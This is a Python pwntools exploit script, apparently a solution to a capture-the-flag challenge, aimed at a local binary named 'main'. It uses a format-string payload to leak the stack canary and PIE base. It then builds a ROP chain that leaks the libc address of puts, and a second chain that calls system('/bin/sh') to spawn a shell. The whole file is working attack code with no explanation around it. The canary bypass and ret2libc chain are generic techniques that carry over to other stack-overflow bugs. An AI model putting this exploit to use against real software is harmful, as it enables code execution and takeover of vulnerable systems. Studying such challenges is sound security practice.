#!/usr/bin/env python3 
from pwn import *

context.update(arch="amd64")

r = process("./main")


###
### Stage 1: Leak stack cookie and PIE
###

# format string payload, we know that cookie is at %11 and return address at %13
fmt_payload = b"%11$p.%13$p"

pause()
r.sendlineafter(b"Please fill in your name:\n", fmt_payload)

r.recvuntil(b"Thank you ")

# parse leaks 
pie_leak_offset = 0x12c5

# receive raw data and split it on the . 
leaks = r.recvline().strip().split(b".")

# calculate pie_base
pie_base = int(leaks[1], 16) - pie_leak_offset
print(f"pie_base: {hex(pie_base)}")

# parse cookie leak 
cookie_leak = int(leaks[0], 16)
print(f"cookie: {hex(cookie_leak)}")

r.recvuntil(b"give me a secret to exploit me :).\n")

###
### Stage 2 : ROP chain to leak LIBC
###

# load ELF binary
e = ELF("./main")
# update address with leaked randomized pie_base
e.address = pie_base
# prepare rop module so we can grab gadgets
rop = ROP(e)

gadgets = [
    rop.find_gadget(['pop rdi', 'ret']).address,
    e.got['puts'],
    e.plt['puts'],
    e.symbols['main']
]


payload = b"A" * 56 + p64(cookie_leak) + b"B" * 8 + b"".join(p64(gadget) for gadget in gadgets)

r.sendline(payload)

# parse libc leak 
r.recvuntil(b"Bye, good luck next time :D \n")
libc_leak = u64(r.recvline().strip().ljust(8, b"\x00"))
print(f"puts@libc: {hex(libc_leak)}")

# calc libc_base and build final payload 
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
libc_base = libc_leak - libc.symbols['puts']
# update libc base address
libc.address = libc_base
print(f"libc_base: {hex(libc_base)}")


### 
### Stage 3 : ROP chain to execute system("/bin/sh")
###

r.sendlineafter(b"Please fill in your name:\n", b"AAA")
r.recvuntil(b"give me a secret to exploit me :).\n")

gadgets = [
    rop.find_gadget(['pop rdi', 'ret']).address,
    next(libc.search(b"/bin/sh\x00")),
    rop.find_gadget(['ret']).address,
    libc.symbols['system']
]


payload = b"A" * 56 + p64(cookie_leak) + b"B" * 8 + b"".join(p64(gadget) for gadget in gadgets)

r.sendline(payload)

r.interactive()